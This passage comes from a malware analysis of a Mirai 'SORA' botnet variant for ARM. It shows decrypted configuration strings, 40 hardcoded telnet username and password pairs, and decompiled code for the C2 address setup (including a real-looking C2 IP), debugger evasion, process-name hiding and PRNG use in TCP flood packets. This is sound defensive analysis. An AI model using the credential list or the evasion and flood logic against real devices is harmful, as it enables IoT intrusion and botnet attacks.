MiraiConfigExtractorSORAArm.java> 00020f84 - 00000024 - 00017e9c - X19I239124UIU. (58 31 39 49 32 33 39 31 32 34 55 49 55 00)
MiraiConfigExtractorSORAArm.java> 00020f8c - 00000025 - 00017eac - IuYgujeIqn."14Fa. (49 75 59 67 75 6A 65 49 71 6E 00 22 31 34 46 61 00)
MiraiConfigExtractorSORAArm.java> 00020f94 - 00000026 - 00017eb8 - 14Fa. (31 34 46 61 00)
MiraiConfigExtractorSORAArm.java> 00020f9c - 00000027 - 00017ec0 - ccAD. (63 63 41 44 00)
MiraiConfigExtractorSORAArm.java> 00020fb4 - 0000002a - 00017ec8 - /proc/net/route. (2F 70 72 6F 63 2F 6E 65 74 2F 72 6F 75 74 65 00)
MiraiConfigExtractorSORAArm.java> 00020fbc - 0000002b - 00017edc - /proc/cpuinfo. (2F 70 72 6F 63 2F 63 70 75 69 6E 66 6F 00)
MiraiConfigExtractorSORAArm.java> 00020fc4 - 0000002c - 00017eec - BOGOMIPS. (42 4F 47 4F 4D 49 50 53 00)
MiraiConfigExtractorSORAArm.java> 00020fcc - 0000002d - 00017ef8 - /etc/rc.d/rc.local. (2F 65 74 63 2F 72 63 2E 64 2F 72 63 2E 6C 6F 63 61 6C 00)
MiraiConfigExtractorSORAArm.java> 00020fd4 - 0000002e - 00017f0c - g1abc4dmo35hnp2lie0kjf. (67 31 61 62 63 34 64 6D 6F 33 35 68 6E 70 32 6C 69 65 30 6B 6A 66 00)
MiraiConfigExtractorSORAArm.java> 00020fdc - 0000002f - 00017f24 - /dev/watchdog. (2F 64 65 76 2F 77 61 74 63 68 64 6F 67 00)
MiraiConfigExtractorSORAArm.java> 00020fe4 - 00000030 - 00017f34 - /dev/misc/watchdog. (2F 64 65 76 2F 6D 69 73 63 2F 77 61 74 63 68 64 6F 67 00)
MiraiConfigExtractorSORAArm.java> 00020fec - 00000031 - 00017f48 - /dev/FTWDT101_watchdog. (2F 64 65 76 2F 46 54 57 44 54 31 30 31 5F 77 61 74 63 68 64 6F 67 00)
MiraiConfigExtractorSORAArm.java> 00020ff4 - 00000032 - 00017f60 - /dev/netslink/. (2F 64 65 76 2F 6E 65 74 73 6C 69 6E 6B 2F 00)
MiraiConfigExtractorSORAArm.java> 00020ffc - 00000033 - 00017f70 - PRIVMSG. (50 52 49 56 4D 53 47 00)
MiraiConfigExtractorSORAArm.java> 00021004 - 00000034 - 00017f7c - GETLOCALIP."KILLA (47 45 54 4C 4F 43 41 4C 49 50 00 22 4B 49 4C 4C 41)
MiraiConfigExtractorSORAArm.java> 0002100c - 00000035 - 00017f88 - KILLATTK. (4B 49 4C 4C 41 54 54 4B 00)
MiraiConfigExtractorSORAArm.java> 00021014 - 00000036 - 00017f94 - Eats8. (45 61 74 73 38 00)
MiraiConfigExtractorSORAArm.java> 0002101c - 00000037 - 00017f9c - v[0v. (76 5B 30 76 00)
MiraiConfigExtractorSORAArm.java> 0002102c - 00000039 - 00017fa4 - 93OfjHZ2z. (39 33 4F 66 6A 48 5A 32 7A 00)
MiraiConfigExtractorSORAArm.java> 0002103c - 0000003b - 00017fc4 - WsGA4@F6F. (57 73 47 41 34 40 46 36 46 00)
MiraiConfigExtractorSORAArm.java> 00021044 - 0000003c - 00017fd0 - ACDB. (41 43 44 42 00)
MiraiConfigExtractorSORAArm.java> 0002104c - 0000003d - 00017fd8 - AbAd. (41 62 41 64 00)
MiraiConfigExtractorSORAArm.java> 00021054 - 0000003e - 00017fe0 - iaGv. (69 61 47 76 00)
MiraiConfigExtractorSORAArm.java> 00021034 - 0000003a - 00017fb0 - GhostWuzHere666 (47 68 6F 73 74 57 75 7A 48 65 72 65 36 36 36)
MiraiConfigExtractorSORAArm.java> 00020f44 - 0000001c - 00017e48 - G...B....CE...GD..F...v (47 11 14 17 42 15 12 19 1B 43 45 18 1E 06 47 44 13 1F 46 1D 10 1C 76)
MiraiConfigExtractorSORAArm.java> 0002119c - 00000067 - 00018788 - Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94. (4D 6F 7A 69 6C 6C 61 2F 35 2E 30 20 28 57 69 6E 64 6F 77 73 20 4E 54 20 31 30 2E 30 3B 20 57 69 6E 36 34 3B 20 78 36 34 29 20 41 70 70 6C 65 57 65 62 4B 69 74 2F 35 33 37 2E 33 36 20 28 4B 48 54 4D 4C 2C 20 6C 69 6B 65 20 47 65 63 6B 6F 29 20 43 68 72 6F 6D 65 2F 36 32 2E 30 2E 33 32 30 32 2E 39 34 00)
MiraiConfigExtractorSORAArm.java> 0002112c - 00000059 - 00018208 - Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36. (4D 6F 7A 69 6C 6C 61 2F 35 2E 30 20 28 57 69 6E 64 6F 77 73 20 4E 54 20 31 30 2E 30 3B 20 57 4F 57 36 34 29 20 41 70 70 6C 65 57 65 62 4B 69 74 2F 35 33 37 2E 33 36 20 28 4B 48 54 4D 4C 2C 20 6C 69 6B 65 20 47 65 63 6B 6F 29 20 43 68 72 6F 6D 65 2F 35 31 2E 30 2E 32 37 30 34 2E 31 30 33 20 53 61 66 61 72 69 2F 35 33 37 2E 33 36 00)
MiraiConfigExtractorSORAArm.java> 00021134 - 0000005a - 00018278 - Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36. (4D 6F 7A 69 6C 6C 61 2F 35 2E 30 20 28 57 69 6E 64 6F 77 73 20 4E 54 20 31 30 2E 30 3B 20 57 4F 57 36 34 29 20 41 70 70 6C 65 57 65 62 4B 69 74 2F 35 33 37 2E 33 36 20 28 4B 48 54 4D 4C 2C 20 6C 69 6B 65 20 47 65 63 6B 6F 29 20 43 68 72 6F 6D 65 2F 35 32 2E 30 2E 32 37 34 33 2E 31 31 36 20 53 61 66 61 72 69 2F 35 33 37 2E 33 36 00)
MiraiConfigExtractorSORAArm.java> 0002113c - 0000005b - 000182e8 - Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36." (4D 6F 7A 69 6C 6C 61 2F 35 2E 30 20 28 57 69 6E 64 6F 77 73 20 4E 54 20 36 2E 31 3B 20 57 4F 57 36 34 29 20 41 70 70 6C 65 57 65 62 4B 69 74 2F 35 33 37 2E 33 36 20 28 4B 48 54 4D 4C 2C 20 6C 69 6B 65 20 47 65 63 6B 6F 29 20 43 68 72 6F 6D 65 2F 35 31 2E 30 2E 32 37 30 34 2E 31 30 33 20 53 61 66 61 72 69 2F 35 33 37 2E 33 36 00 22)
MiraiConfigExtractorSORAArm.java> 00021144 - 0000005c - 00018358 - Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36." (4D 6F 7A 69 6C 6C 61 2F 35 2E 30 20 28 57 69 6E 64 6F 77 73 20 4E 54 20 36 2E 31 3B 20 57 4F 57 36 34 29 20 41 70 70 6C 65 57 65 62 4B 69 74 2F 35 33 37 2E 33 36 20 28 4B 48 54 4D 4C 2C 20 6C 69 6B 65 20 47 65 63 6B 6F 29 20 43 68 72 6F 6D 65 2F 35 32 2E 30 2E 32 37 34 33 2E 31 31 36 20 53 61 66 61 72 69 2F 35 33 37 2E 33 36 00 22)
MiraiConfigExtractorSORAArm.java> 0002114c - 0000005d - 000183c8 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7. (4D 6F 7A 69 6C 6C 61 2F 35 2E 30 20 28 4D 61 63 69 6E 74 6F 73 68 3B 20 49 6E 74 65 6C 20 4D 61 63 20 4F 53 20 58 20 31 30 5F 31 31 5F 36 29 20 41 70 70 6C 65 57 65 62 4B 69 74 2F 36 30 31 2E 37 2E 37 20 28 4B 48 54 4D 4C 2C 20 6C 69 6B 65 20 47 65 63 6B 6F 29 20 56 65 72 73 69 6F 6E 2F 39 2E 31 2E 32 20 53 61 66 61 72 69 2F 36 30 31 2E 37 2E 37 00)
MiraiConfigExtractorSORAArm.java> 00021154 - 0000005e - 00018440 - Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0). (4D 6F 7A 69 6C 6C 61 2F 34 2E 30 20 28 63 6F 6D 70 61 74 69 62 6C 65 3B 20 4D 53 49 45 20 39 2E 30 3B 20 57 69 6E 64 6F 77 73 20 4E 54 20 35 2E 31 3B 20 54 72 69 64 65 6E 74 2F 35 2E 30 29 00)
MiraiConfigExtractorSORAArm.java> 0002115c - 0000005f - 00018484 - Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US). (4D 6F 7A 69 6C 6C 61 2F 34 2E 30 20 28 63 6F 6D 70 61 74 69 62 6C 65 3B 20 4D 53 49 45 20 39 2E 30 3B 20 57 69 6E 64 6F 77 73 20 4E 54 20 36 2E 30 3B 20 54 72 69 64 65 6E 74 2F 34 2E 30 3B 20 47 54 42 37 2E 34 3B 20 49 6E 66 6F 50 61 74 68 2E 33 3B 20 53 56 31 3B 20 2E 4E 45 54 20 43 4C 52 20 33 2E 34 2E 35 33 33 36 30 3B 20 57 4F 57 36 34 3B 20 65 6E 2D 55 53 29 00)
MiraiConfigExtractorSORAArm.java> 00021164 - 00000060 - 00018500 - Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0). (4D 6F 7A 69 6C 6C 61 2F 34 2E 30 20 28 63 6F 6D 70 61 74 69 62 6C 65 3B 20 4D 53 49 45 20 39 2E 30 3B 20 57 69 6E 64 6F 77 73 20 4E 54 20 36 2E 31 3B 20 54 72 69 64 65 6E 74 2F 34 2E 30 3B 20 46 44 4D 3B 20 4D 53 49 45 43 72 61 77 6C 65 72 3B 20 4D 65 64 69 61 20 43 65 6E 74 65 72 20 50 43 20 35 2E 30 29 00)
MiraiConfigExtractorSORAArm.java> 0002116c - 00000061 - 00018568 - Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US). (4D 6F 7A 69 6C 6C 61 2F 34 2E 30 20 28 63 6F 6D 70 61 74 69 62 6C 65 3B 20 4D 53 49 45 20 39 2E 30 3B 20 57 69 6E 64 6F 77 73 20 4E 54 20 36 2E 31 3B 20 54 72 69 64 65 6E 74 2F 34 2E 30 3B 20 47 54 42 37 2E 34 3B 20 49 6E 66 6F 50 61 74 68 2E 32 3B 20 53 56 31 3B 20 2E 4E 45 54 20 43 4C 52 20 34 2E 34 2E 35 38 37 39 39 3B 20 57 4F 57 36 34 3B 20 65 6E 2D 55 53 29 00)
MiraiConfigExtractorSORAArm.java> 00021174 - 00000062 - 000185e4 - Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts). (4D 6F 7A 69 6C 6C 61 2F 34 2E 30 20 28 63 6F 6D 70 61 74 69 62 6C 65 3B 20 4D 53 49 45 20 39 2E 30 3B 20 57 69 6E 64 6F 77 73 20 4E 54 20 36 2E 31 3B 20 54 72 69 64 65 6E 74 2F 35 2E 30 3B 20 46 75 6E 57 65 62 50 72 6F 64 75 63 74 73 29 00)
MiraiConfigExtractorSORAArm.java> 0002117c - 00000063 - 00018638 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0. (4D 6F 7A 69 6C 6C 61 2F 35 2E 30 20 28 4D 61 63 69 6E 74 6F 73 68 3B 20 49 6E 74 65 6C 20 4D 61 63 20 4F 53 20 58 20 31 30 2E 36 3B 20 72 76 3A 32 35 2E 30 29 20 47 65 63 6B 6F 2F 32 30 31 30 30 31 30 31 20 46 69 72 65 66 6F 78 2F 32 35 2E 30 00)
MiraiConfigExtractorSORAArm.java> 00021184 - 00000064 - 0001868c - Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0. (4D 6F 7A 69 6C 6C 61 2F 35 2E 30 20 28 4D 61 63 69 6E 74 6F 73 68 3B 20 49 6E 74 65 6C 20 4D 61 63 20 4F 53 20 58 20 31 30 2E 38 3B 20 72 76 3A 32 31 2E 30 29 20 47 65 63 6B 6F 2F 32 30 31 30 30 31 30 31 20 46 69 72 65 66 6F 78 2F 32 31 2E 30 00)
MiraiConfigExtractorSORAArm.java> 0002118c - 00000065 - 000186e0 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0. (4D 6F 7A 69 6C 6C 61 2F 35 2E 30 20 28 4D 61 63 69 6E 74 6F 73 68 3B 20 49 6E 74 65 6C 20 4D 61 63 20 4F 53 20 58 20 31 30 2E 38 3B 20 72 76 3A 32 34 2E 30 29 20 47 65 63 6B 6F 2F 32 30 31 30 30 31 30 31 20 46 69 72 65 66 6F 78 2F 32 34 2E 30 00)
MiraiConfigExtractorSORAArm.java> 00021194 - 00000066 - 00018734 - Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0. (4D 6F 7A 69 6C 6C 61 2F 35 2E 30 20 28 4D 61 63 69 6E 74 6F 73 68 3B 20 49 6E 74 65 6C 20 4D 61 63 20 4F 53 20 58 20 31 30 5F 31 30 3B 20 72 76 3A 33 33 2E 30 29 20 47 65 63 6B 6F 2F 32 30 31 30 30 31 30 31 20 46 69 72 65 66 6F 78 2F 33 33 2E 30 00)
MiraiConfigExtractorSORAArm.java> 00020f34 - 0000001a - 00017e38 - ....v (19 11 1F 18 76)
MiraiConfigExtractorSORAArm.java> 00020f3c - 0000001b - 00017e40 - .....v (13 18 02 13 04 76)
MiraiConfigExtractorSORAArm.java> 00020f2c - 00000019 - 00017e2c - .......g (06 14 14 10 08 15 03 67)
MiraiConfigExtractorSORAArm.java> 00020e8c - 00000005 - 00017d00 - ......v (13 18 17 14 1A 13 76)
MiraiConfigExtractorSORAArm.java> 00020e94 - 00000006 - 00017d08 - ......v (05 0F 05 02 13 1B 76)
MiraiConfigExtractorSORAArm.java> 00020e9c - 00000007 - 00017d10 - ..v (05 1E 76)
MiraiConfigExtractorSORAArm.java> 00020e84 - 00000004 - 00017cf8 - .....v (05 1E 13 1A 1A 76)
MiraiConfigExtractorSORAArm.java> 00020eb4 - 0000000a - 00017d40 - ........v (18 15 19 04 04 13 15 02 76)
MiraiConfigExtractorSORAArm.java> 00020eac - 00000009 - 00017d28 - %9$7LV......V...V.....v (25 39 24 37 4C 56 17 06 06 1A 13 02 56 18 19 02 56 10 19 03 18 12 76)
MiraiConfigExtractorSORAArm.java> 00020ea4 - 00000008 - 00017d14 - Y...Y.......V%9$7v (59 14 1F 18 59 14 03 05 0F 14 19 0E 56 25 39 24 37 76)
MiraiConfigExtractorSORAArm.java> 00020e7c - 00000003 - 000187f0 - 5........V".V585v (35 19 18 18 13 15 02 13 12 56 22 19 56 35 38 35 76)
MiraiConfigExtractorSORAArm.java> 00020f1c - 00000017 - 00017e08 - Y...Y........v (59 12 13 00 59 01 17 02 15 1E 12 19 11 76)
MiraiConfigExtractorSORAArm.java> 00020f24 - 00000018 - 00017e18 - Y...Y....Y........v (59 12 13 00 59 1B 1F 05 15 59 01 17 02 15 1E 12 19 11 76)
MiraiConfigExtractorSORAArm.java> 00020e6c - 00000001 - 00017cf0 - sV (73 56)
MiraiConfigExtractorSORAArm.java> Finished!
```

#### Encrypted credentials

This variant spreads by targeting devices with telnet running and weak credentials. These credentials are also hardcoded into the binary and encrypted (via a different algorithm). The implemented decryption script is available [here](https://github.com/gemesa/ghidra-scripts/).

```
MiraiCredentialExtractorSORAArm.java> Running...
MiraiCredentialExtractorSORAArm.java> located decryption function: mw_decrypt
MiraiCredentialExtractorSORAArm.java> found 40 credential pairs
MiraiCredentialExtractorSORAArm.java> credential pairs (username : password):
MiraiCredentialExtractorSORAArm.java> ("$??"P" : ""??$P")
MiraiCredentialExtractorSORAArm.java> (""??$P" : "$??"P")
MiraiCredentialExtractorSORAArm.java> ("$??"P" : "$??"P")
MiraiCredentialExtractorSORAArm.java> ("$??"P" : "")
MiraiCredentialExtractorSORAArm.java> ("default" : "")
MiraiCredentialExtractorSORAArm.java> ("default" : "default")
MiraiCredentialExtractorSORAArm.java> ("default" : "altslq")
MiraiCredentialExtractorSORAArm.java> ("default" : "OxhlwSG8")
MiraiCredentialExtractorSORAArm.java> ("default" : "tlJwpbo6")
MiraiCredentialExtractorSORAArm.java> ("default" : "S2fGqNFs")
MiraiCredentialExtractorSORAArm.java> ("root" : "xc3551")
MiraiCredentialExtractorSORAArm.java> ("root" : "vizxv")
MiraiCredentialExtractorSORAArm.java> ("root" : "klv123")
MiraiCredentialExtractorSORAArm.java> ("root" : "admin")
MiraiCredentialExtractorSORAArm.java> ("root" : "zyad1234")
MiraiCredentialExtractorSORAArm.java> ("root" : "zlxx.")
MiraiCredentialExtractorSORAArm.java> ("root" : "default")
MiraiCredentialExtractorSORAArm.java> ("root" : "7ujMko0vizxv")
MiraiCredentialExtractorSORAArm.java> ("root" : "7ujMko0admin")
MiraiCredentialExtractorSORAArm.java> ("root" : "hi3518")
MiraiCredentialExtractorSORAArm.java> ("root" : "cat1029")
MiraiCredentialExtractorSORAArm.java> ("root" : "annie2012")
MiraiCredentialExtractorSORAArm.java> ("root" : "changeme")
MiraiCredentialExtractorSORAArm.java> ("guest" : "")
MiraiCredentialExtractorSORAArm.java> ("guest" : "guest")
MiraiCredentialExtractorSORAArm.java> ("guest" : "12345z")
MiraiCredentialExtractorSORAArm.java> ("guest" : "123456")
MiraiCredentialExtractorSORAArm.java> ("user" : "")
MiraiCredentialExtractorSORAArm.java> ("user" : "user")
MiraiCredentialExtractorSORAArm.java> ("user" : "123456")
MiraiCredentialExtractorSORAArm.java> ("admin" : "")
MiraiCredentialExtractorSORAArm.java> ("admin" : "admin")
MiraiCredentialExtractorSORAArm.java> ("admin" : "pass")
MiraiCredentialExtractorSORAArm.java> ("admin" : "password")
MiraiCredentialExtractorSORAArm.java> ("admin" : "admin1234")
MiraiCredentialExtractorSORAArm.java> ("support" : "support")
MiraiCredentialExtractorSORAArm.java> ("mg3500" : "merlin")
MiraiCredentialExtractorSORAArm.java> ("daemon" : "")
MiraiCredentialExtractorSORAArm.java> ("ubnt" : "ubnt")
MiraiCredentialExtractorSORAArm.java> ("adm" : "")
MiraiCredentialExtractorSORAArm.java> Finished!
```

#### Signal handling and C2 address setup

The signal `SIGINT` (Ctrl + C) is blocked and the child signals are ignored. A signal handler is set for `SIGTRAP` which is an anti debugger feature. In the leaked version the code initializes the C2 address with a [fake IP](https://github.com/jgamblin/Mirai-Source-Code/blob/3273043e1ef9c0bb41bd9fcdc5317f7b797a2a94/mirai/bot/main.c#L106) and later also [raises](https://github.com/jgamblin/Mirai-Source-Code/blob/3273043e1ef9c0bb41bd9fcdc5317f7b797a2a94/mirai/bot/main.c#L114) a `SIGTRAP`. When a debugger is attached, it will catch the `SIGTRAP` and the malware will use the fake C2 server. If no debugger is attached, the C2 address will be overwritten with the real one.

```c
undefined4 mw_main(int param_1,undefined4 *param_2)

{
...
  sigset_t auStack_1fc;
...
  mw_sigemptyset(&auStack_1fc);
  mw_set_signal_mask(&auStack_1fc,SIGINT);
  mw_rt_sigprocmask(SIG_BLOCK,&auStack_1fc,0);
  mw_signal(SIGCHLD,SIG_IGN);
  mw_signal(SIGTRAP,FUN_0000f364);
...
```

```c
void FUN_0000f364(void)

{
  resolve_func = mw_setup_c2_connection;
  return;
}
```

In this variant this mechanism is a bit different since it uses the real C2 address and a fake port number first. They are overwritten later:


```c
undefined4 mw_main(int param_1,undefined4 *param_2)

{
...
  sockaddr_in_00020e48.sin_port._1_1_ = 0x17; // port: 0x1700 = 5888
  sockaddr_in_00020e48.sin_family._0_1_ = 2;
  sockaddr_in_00020e48.sin_addr.s_addr = 0xcffd079a; // IP: 154.7.253.207
  sockaddr_in_00020e48.sin_port._0_1_ = 0;
  sockaddr_in_00020e48.sin_family._1_1_ = 0;
  mw_init_encrypted_config();
  resolve_func = mw_setup_c2_connection;
...
```

```c
void mw_setup_c2_connection(void)

{
  undefined2 *puVar1;
  
  mw_decrypt_with_key(1); // 0x520 = 1312
  sockaddr_in_00020e48.sin_addr.s_addr = mw_inet_aton_w("154.7.253.207");
  puVar1 = (undefined2 *)mw_get_table_entry(1,0);
  sockaddr_in_00020e48.sin_port._1_1_ = (undefined1)((ushort)*puVar1 >> 8);
  sockaddr_in_00020e48.sin_port._0_1_ = (undefined1)*puVar1;
  mw_encrypt_with_key(1);
  return;
}
```

#### Hiding `argv[1]`

`argv[1]` (the first command line argument) is backed up for later use and then cleared. Based on the surrounding code it is likely a unique ID which is sent to the C2 server later.

```c
undefined4 mw_main(int param_1,undefined4 *param_2)

{
...
  mw_memset_zero(mw_id,0x20);
  if ((param_1 == 2) && (iVar3 = mw_strlen((char *)param_2[1]), iVar3 < 0x20)) {
    mw_strcpy(mw_id,param_2[1]);
    pcVar8 = (char *)param_2[1];
    iVar3 = mw_strlen(pcVar8);
    mw_memset_zero(pcVar8,iVar3);
  }
...
            if ((DAT_00020b78 == 0xffffffff) &&
               (uVar2 = mw_socket(2,1,0), DAT_00020b78 = uVar2, uVar2 != 0xffffffff)) {
...                                 
              mw_connect(DAT_00020b78,&sockaddr_in_00020e48,0x10);
...
                mw_send(DAT_00020b78,mw_id,(char)local_26,0x4000);
...
```

#### Hiding `argv[0]`

`argv[0]` (the program name) is overwritten by a random generated string.

```c
undefined4 mw_main(int param_1,undefined4 *param_2)

{
...
  uVar2 = mw_get_prng();
  iVar3 = mw_strlen((char *)*param_2);
  iVar4 = mw_strlen((char *)*param_2);
  iVar3 = mw_unsigned_modulo(uVar2,0x14 - iVar3);
  mw_xorshift128_str(auStack_5c,iVar3 + iVar4);
  iVar9 = 0;
  uVar5 = *param_2;
  auStack_5c[iVar3 + iVar4] = 0;
  mw_strcpy(uVar5,auStack_5c);
  mw_memset_zero(auStack_5c,0x20);
...
```

#### Hiding the process name

The process name is also overwritten by an other random generated string.

```c
undefined4 mw_main(int param_1,undefined4 *param_2)

{
...
  uVar2 = mw_get_prng();
  iVar3 = mw_strlen((char *)*param_2);
  iVar4 = mw_strlen((char *)*param_2);
  iVar3 = mw_unsigned_modulo(uVar2,0x14 - iVar3);
  mw_xorshift128_str(auStack_5c,iVar3 + iVar4);
  auStack_5c[iVar3 + iVar4] = 0;
  mw_prctl(PR_SET_NAME,auStack_5c);
...
```

#### `mw_get_local_ip`

`mw_get_local_ip` creates a UDP socket to 8.8.8.8:53 and uses `getsockname()` to determine the device's local IP address, which is used by the leaked version to ensure only a [single instance is running](https://github.com/jgamblin/Mirai-Source-Code/blob/3273043e1ef9c0bb41bd9fcdc5317f7b797a2a94/mirai/bot/main.c#L432) on the machine (in this variant there is no such check implemented) and as source address in the crafted attack packets.

```c
in_addr_t mw_get_local_ip(void)

{
  undefined4 *puVar1;
  int iVar2;
  sockaddr_in local_28;
  undefined4 local_18;
  
  local_18 = 0x10;
  puVar1 = (undefined4 *)mw_get_errno_location();
  *puVar1 = 0;
  iVar2 = mw_socket(2,2,0);
  local_28.sin_addr.s_addr = 0;
  if (iVar2 != -1) {
    local_28.sin_family._0_1_ = 2;
    local_28.sin_port._1_1_ = 0x35; // 53
    local_28.sin_addr.s_addr = 0x8080808; // 8.8.8.8
    local_28.sin_port._0_1_ = 0;
    local_28.sin_family._1_1_ = 0;
    mw_connect(iVar2,&local_28,0x10);
    mw_getsockname(iVar2,&local_28,&local_18);
    mw_close(iVar2);
  }
  return local_28.sin_addr.s_addr;
}
```

```c
void mw_scanner(void)

{
...
  DAT_00020e38 = mw_get_local_ip();
...
```
```c
void mw_tcp_null_flood(uint param_1,int param_2,uint param_3,int *param_4)

{
...
  source_ip = mw_lookup_ip(param_3,param_4,0x19,DAT_00020e38);
...
          (iph->iphdr).saddr = source_ip;
...
```

#### `mw_init_encrypted_config`

`mw_init_encrypted_config` copies the encrypted configuration data from `.rodata` to heap blocks. Later the code only decrypts each config data block for a short period of time when necessary before encrypting them again. The data blocks are referenced indirectly by the base config address plus an offset value (see `mw_decrypt_with_key`, `mw_get_table_entry` and `mw_encrypt_with_key` below).

```c
void mw_init_encrypted_config(void)

{
  undefined4 uVar1;
  
  uVar1 = mw_alloc(2);
  mw_memcpy(uVar1,"Qt",2);
  DAT_00020e70 = 2;
  DAT_00020e71 = 0;
  DAT_00020e6c = uVar1;
  uVar1 = mw_alloc(2);
  mw_memcpy(uVar1,"[\x1c",2);
  DAT_00020e78 = 2;
  DAT_00020e79 = 0;
  DAT_00020e74 = uVar1;
...
```

#### `mw_seed_prng`

`mw_seed_prng` initializes the seed for the xorshift128 pseudo random generator.

```c
void mw_seed_prng(void)

{
  uint uVar1;
  uint uVar2;
  
  DAT_00020dac = mw_time(0);
  uVar1 = mw_getpid();
  uVar2 = mw_getppid();
  DAT_00020db0 = uVar1 ^ uVar2;
  DAT_00020db4 = mw_get_timing_entropy();
  DAT_00020db8 = DAT_00020db4 ^ DAT_00020db0;
  return;
}
```
```c
uint mw_get_timing_entropy(void)

{
  int local_14;
  int local_10;
  
  mw_times(&local_14);
  return (local_14 + local_10) * 10000 & 0x7ffffff0;
}
```

#### `mw_xorshift128_ulong`

A description for the xorshift128 algorithm can be found [here](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.jstatsoft.org/article/view/v008i14/916&ved=2ahUKEwiaypaAlI2NAxXjg4kEHYyiC18QFnoECBYQAQ&usg=AOvVaw3GFJzLacrHh5-u-rvj9a-F). It is used to generate random values (e.g. source port numbers) for attack packets.

```c
uint mw_xorshift128_ulong(void)

{
  uint uVar1;
  
  uVar1 = DAT_00020dac ^ DAT_00020dac << 0xb;
  uVar1 = uVar1 ^ DAT_00020db8 ^ DAT_00020db8 >> 0x13 ^ uVar1 >> 8;
  DAT_00020dac = DAT_00020db0;
  DAT_00020db0 = DAT_00020db4;
  DAT_00020db4 = DAT_00020db8;
  DAT_00020db8 = uVar1;
  return uVar1;
}
```

```c
void mw_tcp_null_flood(uint param_1,int param_2,uint param_3,int *param_4)

{
...
          if ((sport & 0xffff) == 0xffff) {
            tmp = mw_xorshift128_ulong();
            *(char *)&(pcVar7->tcphdr).source = (char)tmp;
            *(char *)((int)&(pcVar7->tcphdr).source + 1) = (char)(tmp >> 8);
...
```

#### `mw_xorshift128_str`

`mw_xorshift128_str` uses the same xorshift128 algorithm but generates strings instead. It is used to generate random program and process names (see chapter "Hiding `argv[0]`" and "Hiding the process name").

```c
void mw_xorshift128_str(int param_1,int param_2)

{
  undefined4 uVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  char acStack_44 [32];
  
  mw_decrypt_with_key(0x1c);
  uVar1 = mw_get_table_entry(0x1c,0);
  mw_strcpy_with_offset(acStack_44,uVar1);
  if (param_2 != 0) {
    iVar4 = 0;
    do {
      uVar3 = DAT_00020dac ^ DAT_00020dac << 0xb;
      uVar3 = uVar3 ^ DAT_00020db8 ^ DAT_00020db8 >> 0x13 ^ uVar3 >> 8;
      DAT_00020dac = DAT_00020db0;
      DAT_00020db0 = DAT_00020db4;
      DAT_00020db4 = DAT_00020db8;
      DAT_00020db8 = uVar3;
      iVar2 = mw_strlen(acStack_44);
      iVar2 = mw_unsigned_modulo(uVar3,iVar2);
      *(char *)(iVar4 + param_1) = acStack_44[iVar2];
      iVar4 = iVar4 + 1;
    } while (iVar4 != param_2);
  }
  mw_encrypt_with_key(0x1c);
  return;
}
```

#### `mw_decrypt_with_key`, `mw_get_table_entry` and `mw_encrypt_with_key`

`mw_decrypt_with_key` decrypts the configuration data blocks initialized earlier by `mw_init_encrypted_config`. The data blocks can be chosen by their ID (offset). The decrypted data is available via `mw_get_table_entry` and is re-encrypted via `mw_encrypt_with_key` after it has been used and is no longer necessary to be available in plain form. Example usage (config ID = 0x4a): 

```c
...
        mw_decrypt_with_key(0x4a);
        uVar13 = mw_get_table_entry(0x4a,0);
        // use the decrypted data via uVar13
        mw_encrypt_with_key(0x4a);
...
```

```c
void mw_decrypt_with_key(uint param_1)

{
  int iVar1;
  byte bVar2;
  uint uVar3;
  uint uVar4;
  undefined4 uVar5;
  int iVar6;
  int *piVar7;
  
  uVar5 = mw_key;
  iVar1 = (param_1 & 0xff) * 8;
  piVar7 = (int *)(&DAT_00020e64 + iVar1);
  uVar3 = (uint)mw_key >> 8;
  uVar4 = (uint)mw_key >> 0x10;
  bVar2 = (byte)mw_key;
  if (*(short *)(&DAT_00020e68 + iVar1) == 0) {
    return;
  }
  iVar6 = 0;
  do {
    *(byte *)(iVar6 + *piVar7) = bVar2 ^ *(byte *)(iVar6 + *piVar7);
    *(byte *)(iVar6 + *piVar7) = (byte)uVar3 ^ *(byte *)(iVar6 + *piVar7);
    *(byte *)(iVar6 + *piVar7) = (byte)uVar4 ^ *(byte *)(iVar6 + *piVar7);
    *(byte *)(iVar6 + *piVar7) = (byte)((uint)uVar5 >> 0x18) ^ *(byte *)(iVar6 + *piVar7);
    iVar6 = iVar6 + 1;
  } while (iVar6 < (int)(uint)*(ushort *)(&DAT_00020e68 + iVar1));
  return;
}
```

```c
undefined4 mw_get_table_entry(int param_1,uint *param_2,uint param_3)

{
  undefined4 uVar1;
  undefined *puVar2;
  
  param_1 = param_1 * 8;
  puVar2 = &DAT_00020e64 + param_1;
